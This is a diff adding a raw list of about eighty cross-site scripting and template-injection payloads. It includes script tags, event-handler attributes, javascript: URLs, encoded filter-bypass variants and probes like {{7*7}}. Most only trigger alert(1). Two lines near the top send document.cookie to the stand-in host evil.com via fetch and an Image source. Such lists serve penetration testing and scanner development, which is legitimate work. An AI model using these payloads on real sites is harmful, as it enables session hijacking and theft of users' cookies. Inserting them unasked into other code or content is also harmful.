@@ -1,0 +1,82 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>fetch('https://evil.com?c='+document.cookie)</script>
+<script>new Image().src='https://evil.com?c='+document.cookie</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src="javascript:alert(1)">
+<img src=1 href=1 onerror="javascript:alert(1)">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(1)//
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe onload=alert(1)>
+<iframe src=data:text/html,<script>alert(1)</script>>
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.cookie)
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+</tag><script>alert(1)</script>
+'onmouseover='alert(1)
+"onmouseover="alert(1)
+' onmouseover='alert(1)
+" onmouseover="alert(1)
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>
+<div onmouseover="alert(1)">hover</div>
+<div onclick="alert(1)">click</div>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<script/src=data:,alert(1)>
+<script>window['alert'](1)</script>
+<script>eval('alert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+${{7*7}}
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<table background="javascript:alert(1)">
+<div style="background:url(javascript:alert(1))">
+<style>*{background:url(javascript:alert(1))}</style>
+<base href="javascript:alert(1)//">
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<isindex src="javascript:alert(1)" type=image>
